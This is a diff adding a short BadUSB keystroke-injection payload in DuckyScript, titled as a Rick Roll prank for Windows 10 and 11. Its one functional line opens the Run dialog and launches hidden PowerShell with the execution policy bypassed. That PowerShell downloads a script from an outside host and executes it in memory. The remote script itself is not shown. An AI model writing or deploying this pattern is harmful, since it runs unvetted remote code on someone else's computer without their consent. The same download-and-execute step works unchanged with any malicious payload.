@@ -1,0 +1,10 @@
+REM     Title: ADV-RickRoll (Memory-Only Bypass)
+REM     Author: I am Jakoby (modified for execution policy bypass)
+REM     Description: Plays Rick Roll fullscreen at max volume without saving files to disk.
+REM     Target: Windows 10, 11
+
+DELAY 2000
+GUI r
+DELAY 800
+STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -UseBasicParsing 'https://jakoby.lol/rr.ps1')"
+ENTER
